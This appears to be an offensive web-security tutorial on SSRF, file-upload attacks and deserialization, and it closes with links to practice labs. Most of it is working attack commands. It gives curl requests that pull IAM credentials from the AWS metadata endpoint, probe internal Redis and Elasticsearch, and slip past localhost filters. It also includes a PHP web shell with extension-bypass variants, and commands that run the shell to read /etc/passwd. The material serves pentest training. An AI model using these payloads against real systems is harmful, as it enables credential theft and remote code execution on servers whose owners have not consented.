# SSRF, file uploads, and deserialization — server-side attack surfaces

These three vulnerabilities let attackers reach internal systems or execute code on the server.

## SSRF — Server-Side Request Forgery

Find parameters that accept URLs:
```
url=, redirect=, fetch=, webhook=, callback=, next=, dest=
```

Test by pointing them at internal addresses:
```bash
# AWS metadata endpoint (returns IAM credentials in cloud environments)
curl "http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/"
curl "http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# Internal services
curl "http://target.com/fetch?url=http://localhost:6379/"           # Redis
curl "http://target.com/fetch?url=http://localhost:9200/_cat/nodes" # Elasticsearch
curl "http://target.com/fetch?url=http://10.0.0.1/"                 # internal host

# Bypass localhost filters
curl "http://target.com/fetch?url=http://127.0.0.1/"
curl "http://target.com/fetch?url=http://0.0.0.0/"
curl "http://target.com/fetch?url=http://[::1]/"
```

If the response contains internal data: SSRF confirmed.

## File upload attacks

```bash
# Create a simple PHP web shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# If server checks extension — try bypassing
cp shell.php shell.php.jpg           # double extension
cp shell.php shell.phtml             # alternative PHP extension
cp shell.php shell.php5              # another PHP extension
cp shell.php shell.PhP               # case variation

# Set Content-Type to image while keeping .php extension
# In Burp: change Content-Type header to image/jpeg but keep filename as shell.php
```

After upload, access the shell:
```bash
curl "http://target.com/uploads/shell.php?cmd=id"
curl "http://target.com/uploads/shell.php?cmd=cat+/etc/passwd"
```

## File upload checklist

- Try uploading `.php`, `.php5`, `.phtml`, `.phar`
- Try changing Content-Type to `image/jpeg` while keeping `.php` extension
- Try null byte: `shell.php%00.jpg`
- Check where uploaded files are stored — sometimes accessible, sometimes not
- Test with a polyglot file: valid image that also contains PHP code

## Deserialization — quick identification

Look for base64 blobs in cookies or request bodies that decode to serialized objects:
```bash
# PHP serialized object signature
echo "O:4:\"User\":1:{s:4:\"name\";s:5:\"admin\";}" | base64

# Java serialized object starts with: rO0AB (base64 of AC ED 00 05)
echo "rO0AB..." | base64 -d | xxd | head -1
# should show: ac ed 00 05
```

Use ysoserial for Java deserialization payloads: https://github.com/frohoff/ysoserial

## Practice

PortSwigger SSRF labs (7 labs): https://portswigger.net/web-security/ssrf
PortSwigger File Upload labs (6 labs): https://portswigger.net/web-security/file-upload
TryHackMe "SSRF": https://tryhackme.com/room/ssrfqi
